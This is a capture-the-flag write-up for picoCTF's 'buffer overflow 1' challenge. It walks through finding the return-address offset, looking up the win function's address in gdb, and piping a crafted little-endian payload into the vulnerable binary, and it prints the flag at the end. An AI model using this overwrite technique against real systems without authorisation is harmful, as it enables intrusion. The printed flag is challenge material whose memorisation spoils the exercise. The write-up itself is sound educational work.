# buffer overflow 1
__Category:__ Binary Exploitation   
__Points:__ 200

### Problem:

Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](vuln)? You can find it in /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78 on the shell server. [Source](vuln.c).

##### Hints:
> This time you're actually going to have to control that return address!

> Make sure you consider Big Endian vs Little Endian.

### Solution:

I started out by taking a look at the source which consists of three functions. win, vuln and main. 
Upon quick inspection it seems win reads the flag from a file on the server, vuln gets user input then calls get_return_address.
I'd assume get_return_adress is referenced in asm.h, a custom header included in the program.
Main does some setup then calls vuln.

I then ran the program on te picoCTF shell. Since vul uses a buffer of 32 chars I first entered less than 32 chars.
```aaaa```
vuln printed the address 0x80486b3.

I then entered 32 chars followed by the digitz 0-9 and the alphabet
```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0123456789abcdefghijklmnopqrstuvwxyz```
vuln printed the adress 0x66656463. This is the hex value of "fedc" so it seems overflowing the buffer overwrites the return value of get_return_address.

I then used gdb to get the address of win.

```bash
$ gdb vuln
(gdb) info address win
Symbol "win" is at 0x80485cb in a file compiled without debugging.
```
I then echoed the string used before into vuln, replacing 'cdef' with '\xcb\x85\x04\x08'

```bash
$ echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0123456789ab\xcb\x85\x04\x08ghijklmnopqrstuvwxyz" | ./vuln              
Please enter your string:                                           
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb     
picoCTF{addr3ss3s_ar3_3asy65489706}Segmentation fault (core dumped)
```

### Flag:

picoCTF{addr3ss3s_ar3_3asy65489706}
